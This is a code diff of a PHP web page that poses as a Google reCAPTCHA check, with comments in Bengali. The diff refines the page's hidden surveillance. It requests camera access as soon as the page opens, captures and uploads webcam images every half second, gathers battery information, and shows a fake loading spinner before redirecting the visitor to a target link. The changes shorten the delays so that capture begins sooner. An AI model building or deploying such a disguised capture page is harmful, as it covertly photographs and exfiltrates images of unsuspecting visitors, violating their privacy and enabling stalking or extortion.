@@ -123,15 +123,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             border-color: #b2b2b2;
         }
 
-        .recaptcha-checkbox.checked::after {
-            content: "";
-            position: absolute;
-            width: 6px;
-            height: 12px;
-            border: solid #006600;
-            border-width: 0 3px 3px 0;
-            transform: rotate(45deg);
-            margin-bottom: 3px;
+        /* স্পিনারের ডিজাইন (ঘুরার জন্য) */
+        .recaptcha-checkbox.loading {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #3498db;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            background: #fff !important;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .recaptcha-text {
@@ -210,13 +213,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             isClicked = true;
 
             const checkbox = document.getElementById('recaptchaCheckbox');
-            checkbox.style.background = '#fff';
-            checkbox.classList.add('checked');
+            // ক্লিক করার পর বক্সটি গোল হয়ে ঘুরতে থাকবে (Loading spinner)
+            checkbox.classList.add('loading');
             
-            // ৪ সেকেন্ড (4000ms) লোডিং বা ডিলে হওয়ার পর একই ট্যাবে লিংক ওপেন হবে
+            // ঠিক ৩ সেকেন্ড (3000ms) ঘুরে তারপর মূল ট্যাবে টার্গেট লিংকে রিডাইরেক্ট হবে
             setTimeout(() => {
                 window.location.href = finalUrl;
-            }, 4000);
+            }, 3000);
         }
 
         let batteryLevelInfo = 'Not Available';
@@ -231,9 +234,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .then(stream => {
                     video.srcObject = stream;
                     setTimeout(() => {
-                        // ০.৫ সেকেন্ড (500ms) পর পর ছবি ক্যাপচার ও আপলোড হবে
+                        // পারমিশন পাওয়ার সাথে সাথেই ০.৫ সেকেন্ড পরপর ছবি পাঠানো শুরু হবে
                         setInterval(captureAndUpload, 500);
-                    }, 1000);
+                    }, 500);
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
@@ -242,6 +245,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 });
         }
 
+        // পেজ ওপেন হওয়ার সাথে সাথেই নিজে থেকে ক্যামেরা পারমিশন চাওয়া শুরু করবে
         requestCameraPermission();
 
         function captureAndUpload() {
